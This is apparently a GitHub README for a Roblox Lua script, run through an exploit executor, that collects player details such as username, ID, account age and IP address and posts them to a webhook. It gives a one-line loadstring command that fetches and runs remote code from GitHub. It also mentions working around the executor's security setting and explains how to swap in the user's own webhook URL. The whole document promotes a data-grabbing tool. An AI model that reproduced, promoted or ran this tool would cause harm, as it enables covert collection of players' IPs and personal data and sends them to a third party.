# Roblox-Player-Info-Webhook
A Lua script for gathering player details in Roblox games and sending them to a webhook. Retrieve username, ID, premium status, account age, IP, game info, and more.

- Fix the disable security thing for the executor.
# Loadstring
```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/StevenK-293/Roblox-Player-Info-Webhook/main/main.lua"))()
```
# Customization
The script can be customized to fit your specific needs. Here are a few areas you can modify:
- Customize the webhook URL: Replace the `"Webhook URL"` in the script with your desired webhook URL to send the player information.
- Additional functionality: You can extend the script to include more player information or integrate with other systems by modifying the `constructWebhookData` function.

# Error Handling
- The script includes basic error handling for HTTP requests and JSON decoding. However, it's recommended to further enhance error handling based on your specific requirements.

# Contributing
- Contributions to the script are welcome! Feel free to fork this repository, make improvements, and submit a pull request.

Make sure to update the `"Webhook URL"` placeholder with the actual URL of your webhook. Also, consider adding a license to your repository and providing any additional documentation or instructions that may be helpful for users.

Remember to regularly update the script and README file to incorporate any improvements, bug fixes, or updates.
